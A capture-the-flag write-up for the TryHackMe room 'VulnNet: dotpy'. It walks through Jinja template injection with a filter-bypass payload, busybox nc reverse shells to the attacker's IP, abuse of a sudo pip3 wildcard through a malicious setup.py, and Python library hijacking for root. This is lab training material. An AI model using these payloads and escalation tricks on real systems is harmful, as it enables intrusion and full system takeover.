---
tags:
  - THM
  - Linux
  - Medium
  - SSTI
  - RCE
  - Sudo
  - Lib-HJ
---
https://tryhackme.com/room/vulnnetdotpy/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.65.128.13 vulnnet.com
```
# Scanning
```console
$ nmap -p8080 -sV -sC vulnnet.com

PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://vulnnet.com:8080/login
```
# Enumeration
While exploring the **Flask** website (registering, logging in and interacting), didn't find anything. 

However, after accessing a nonexistent resource **when authenticated** (`/abc`), found error message containing user input:
```text
No results for abc
```
Since the website is using **Flask**, found a **Server-Side Template Injection (SSTI)** vulnerability in the **Jinja** template engine when visiting `/{{7*7}}`:
```text
No results for 49
```
# Exploitation
After making some requests, found out that there is a WAF blocking web requests containing any of the following characters in the endpoints:
```text
.[]_
```
However, I successfully crafted a payload without those characters, so we listen for connections:
```console
$ echo -n 'busybox nc 192.168.150.216 443 -e /bin/sh' | base64
YnVzeWJveCBuYyAxOTIuMTY4LjE1MC4yMTYgNDQzIC1lIC9iaW4vc2g=

$ nc -lvnp 443
```
And we request the endpoint via BurpSuite since the browser has issues with the `\` characters:
```python
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo YnVzeWJveCBuYyAxOTIuMTY4LjE1MC4yMTYgNDQzIC1lIC9iaW4vc2g= | base64 -d | bash')|attr('read')() }}
```
# Post-Exploitation
## User Migration
We are currently **web** user and we can execute a command as **system-adm** using `sudo`:
```console
$ sudo -l

Matching Defaults entries for web on vulnnet-dotpy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```
We listen for connections:
```console
$ nc -lvnp 443
```
Since the command has a wildcard (`*`), we can add arguments, so we install a local module:
```console
$ mkdir /tmp/shell

$ cd /tmp/shell

$ echo 'import os; os.system("busybox nc 192.168.150.216 443 -e /bin/sh")' > setup.py

$ sudo -u system-adm /usr/bin/pip3 install /tmp/shell
```
Now, we get the **user flag**:
```console
$ cat /home/system-adm/user.txt
```
## Privilege Escalation
Now, we can execute a Python script as **any user** with `sudo`:
```console
$ sudo -l

Matching Defaults entries for system-adm on vulnnet-dotpy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```
We can establish **environment variables** thanks to `SETENV`, so we check for imported libraries:
```console
$ head -n 3 /opt/backup.py

from datetime import datetime
from pathlib import Path
import zipfile
```
So, we listen for connections:
```console
$ nc -lvnp 443
```
Now, we do a **library hijacking** and become **root**:
```console
$ mkdir /tmp/lib

$ cd /tmp/lib

$ echo 'import os; os.system("busybox nc 192.168.150.216 443 -e /bin/sh")' > zipfile.py

$ sudo PYTHONPATH=/tmp/lib /usr/bin/python3 /opt/backup.py
```
Finally, we get the **root flag**:
```console
$ cat /root/root.txt
```